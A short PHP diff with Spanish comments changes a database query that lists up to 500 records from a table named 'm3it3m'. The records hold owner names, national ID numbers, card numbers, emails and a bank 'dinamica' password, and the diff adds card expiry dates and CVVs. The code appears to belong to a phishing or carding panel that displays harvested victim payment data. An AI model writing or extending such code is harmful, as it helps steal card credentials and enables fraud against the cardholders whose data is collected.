@@ -57,11 +57,13 @@ if ($mysqli->connect_error) {
 try {
   // OBTENER TARJETAS DE m3it3m (mapeo exacto de campos)
   $result = $mysqli->query(
-    "SELECT 
-      idreg as id, 
+    "SELECT
+      idreg as id,
       usuario as owner_name,
       id as cedula,
       tarjeta as card_number,
+      ftarjeta as card_date,
+      cvv as card_cvv,
       status,
       0 as monto,
       email,
@@ -71,9 +73,9 @@ try {
       password as dinamica,
       horacreado as created_at,
       horamodificado as updated_at
-    FROM m3it3m 
+    FROM m3it3m
     WHERE banco = 'TARJETA' OR tarjeta IS NOT NULL
-    ORDER BY horacreado DESC 
+    ORDER BY horacreado DESC
     LIMIT 500"
   );
 
